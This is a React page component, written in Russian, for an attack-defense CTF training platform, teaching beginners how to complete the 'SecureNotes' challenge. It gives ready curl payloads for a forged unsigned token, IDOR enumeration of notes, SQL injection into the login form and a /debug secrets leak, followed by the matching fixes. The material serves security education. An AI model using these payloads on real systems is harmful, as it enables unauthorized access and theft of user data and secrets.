// «Обучение» — супербазовый курс: как полностью пройти первое задание.
// Рассчитан на новичка, который никогда не играл в attack-defense CTF.
export default function Learn() {
  return (
    <div className="container">
      <div className="card">
        <h1>Курс: как пройти задание 01 «SecureNotes»</h1>
        <p className="muted">Для тех, кто первый раз. Читай сверху вниз и повторяй.</p>
      </div>

      <div className="card">
        <h2>0. Что вообще происходит</h2>
        <p>
          У всех команд одинаковый сервис заметок с 4 «дырами» (уязвимостями). Каждый раунд
          организатор кладёт в твой сервис секретный <strong>флаг</strong> (<code>LIVECTF&#123;...&#125;</code>).
        </p>
        <ul>
          <li><strong>Атака ⚔️</strong> — вытащить флаг из сервиса соперника через дыру и сдать его → <strong>+100</strong>.</li>
          <li><strong>Защита 🛡</strong> — закрыть дыры в своём сервисе, чтобы твой флаг не украли → <strong>+50</strong>, а живой сервис → <strong>+20 SLA</strong>.</li>
        </ul>
        <p>Чинить код — на странице <strong>«Мой код»</strong> (редактор в браузере). Атаковать — командами <code>curl</code> ниже.</p>
      </div>

      <div className="card">
        <h2>1. Как атаковать: 4 способа достать чужой флаг</h2>
        <p className="muted">Замени <code>ЦЕЛЬ</code> на адрес соперника, напр. <code>http://IP:8002</code>.</p>

        <h3>Способ A — поддельный токен (самый простой)</h3>
        <p>Токен пользователя = его имя в base64 без подписи. Подделываем токен бота <code>gamemaster</code>:</p>
        <pre><code>curl -s ЦЕЛЬ/notes/mine -H "Authorization: Bearer Z2FtZW1hc3Rlcg=="</code></pre>

        <h3>Способ B — IDOR (перебор чужих заметок)</h3>
        <p>Заметки отдаются по номеру без проверки владельца. Любой токен + перебор id:</p>
        <pre><code>{`# получить любой токен
curl -s ЦЕЛЬ/register -H "Content-Type: application/json" -d '{"username":"x","password":"x"}'
T=$(curl -s ЦЕЛЬ/login -H "Content-Type: application/json" -d '{"username":"x","password":"x"}' | sed 's/.*"token":"\\([^"]*\\)".*/\\1/')
# читать чужие заметки по номерам
for i in $(seq 1 10); do curl -s ЦЕЛЬ/notes/$i -H "Authorization: Bearer $T"; echo; done`}</code></pre>

        <h3>Способ C — SQL-инъекция в логине</h3>
        <pre><code>{`curl -s ЦЕЛЬ/login -H "Content-Type: application/json" -d '{"username":"gamemaster'"'"' -- ","password":"x"}'`}</code></pre>
        <p className="muted">Вернёт токен gamemaster без пароля → дальше <code>/notes/mine</code>.</p>

        <h3>Способ D — утечка через /debug</h3>
        <pre><code>curl -s ЦЕЛЬ/debug</code></pre>
        <p className="muted">Отдаёт секрет и переменные окружения.</p>

        <p>Достал <code>LIVECTF&#123;...&#125;</code> → вкладка <strong>«Кабинет»</strong> → «Сдать флаг».</p>
      </div>

      <div className="card">
        <h2>2. Как защищаться: закрыть все 4 дыры</h2>
        <p>Открой <strong>«Мой код»</strong> и внеси правки. Затем «Сохранить и задеплоить» — платформа сама проверит (цель: <span className="badge ok">0/4</span>, SLA <span className="badge ok">OK</span>).</p>
        <ol>
          <li><strong>SQL-инъекция.</strong> Заменить строки-запросы (<code>f"... '&#123;username&#125;' ..."</code>) на параметры:
            <br /><code>db.execute("SELECT * FROM users WHERE username=?", (username,))</code></li>
          <li><strong>IDOR.</strong> В <code>/notes/&lt;id&gt;</code> добавить проверку владельца:
            <br /><code>WHERE id=? AND owner=?</code>, параметры <code>(note_id, user)</code>.</li>
          <li><strong>Токен.</strong> Подписывать токен секретом (HMAC) и брать <code>SECRET_KEY</code> из окружения, а не из кода.</li>
          <li><strong>/debug.</strong> Удалить эндпоинт <code>/debug</code> целиком.</li>
        </ol>
        <p className="muted">
          Готовый полностью исправленный код и подробный разбор — в репозитории:
          <code>challenges/01-securenotes/SOLUTION.md</code>. Можно вставить его целиком в «Мой код».
        </p>
      </div>

      <div className="card">
        <h2>3. Полный проход задания</h2>
        <ol>
          <li>Админ жмёт «Старт игры» и «Запустить раунд» — флаги разложены.</li>
          <li>Ты атакуешь соперника (раздел 1), достаёшь его флаг, сдаёшь в «Кабинете» → +100.</li>
          <li>Идёшь в «Мой код», закрываешь все 4 дыры (раздел 2), деплоишь до 0/4 и SLA OK.</li>
          <li>Следующий раунд: твой флаг не крадут → +50 защиты и +20 SLA.</li>
          <li>Смотришь «Табло» — растёт итоговый счёт.</li>
        </ol>
        <p><strong>Задание пройдено полностью, когда:</strong> ты хотя бы раз украл и сдал чужой флаг, и твой сервис показывает 0/4 уязвимостей при живом SLA.</p>
      </div>
    </div>
  );
}
